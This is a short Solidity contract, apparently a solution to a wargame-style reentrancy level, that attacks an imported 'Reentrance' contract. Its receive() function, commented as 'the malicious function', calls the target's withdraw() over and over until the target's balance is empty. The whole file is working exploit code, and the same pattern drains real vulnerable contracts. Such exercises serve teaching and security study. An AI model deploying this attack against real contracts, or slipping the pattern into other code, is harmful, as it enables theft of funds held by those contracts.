// SPDX-License-Identifier: MIT

pragma solidity ^0.6.10;

import './Reentrance.sol';

contract ReentranceAttack {
    Reentrance target; 
    uint public amount = 0.001 ether;    //withdrawal amount each time defined from victim contract initial balance
    
    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
    }
    
    function donateToTarget() public {
        target.donate{value: amount, gas: 4000000}(address(this)); //need to add value to this fn
    }
    
    receive() external payable { // this is the malicious function
        if (address(target).balance != 0 ) {
            target.withdraw(amount); 
        }
    }
}